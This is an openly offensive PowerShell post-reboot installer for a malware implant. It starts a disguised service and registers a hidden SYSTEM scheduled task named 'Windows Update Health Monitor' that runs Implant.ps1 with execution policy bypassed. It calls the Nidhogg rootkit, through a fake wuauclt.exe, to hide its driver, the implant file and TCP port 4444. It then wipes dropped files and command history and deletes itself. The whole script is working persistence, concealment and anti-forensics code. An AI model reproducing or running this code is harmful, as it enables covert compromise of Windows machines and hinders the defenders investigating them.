# Install_Implant_PostBoot.ps1 - Post-reboot configuration
$TargetDir = "C:\Windows\System32"

Write-Host "[+] Post-Boot Configuration Running..." -ForegroundColor Cyan

# Start Driver
sc.exe start "WindowsUpdateSvc" | Out-Null
Start-Sleep -Seconds 2

# Copy Implant again (in case)
Copy-Item ".\Implant.ps1" "$TargetDir\Implant.ps1" -Force -ErrorAction SilentlyContinue

# Persistence Task (main implant)
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File $TargetDir\Implant.ps1"

$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "Windows Update Health Monitor" `
    -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

# Apply Nidhogg protections
if (Test-Path "$TargetDir\wuauclt.exe") {
    $n = "$TargetDir\wuauclt.exe"
    & $n driver hide "$TargetDir\drivers\Nidhogg.sys"
    & $n file hide "$TargetDir\Implant.ps1"
    & $n port hide 4444 tcp remote
    Write-Host "[+] Nidhogg protections applied" -ForegroundColor Green
}

# Cleanup
Remove-Item "$env:TEMP\*.ps1" -Force -EA SilentlyContinue
Remove-Item "C:\*.exe","C:\*.sys","C:\*.ps1","C:\*.cer" -Force -EA SilentlyContinue
Clear-History

Write-Host "`n=== Post-Boot Installation Complete ===" -ForegroundColor Green
Write-Host "Implant is now active with migration + hiding." -ForegroundColor Green

# Self-delete this post-boot script
Remove-Item $MyInvocation.MyCommand.Path -Force -EA SilentlyContinue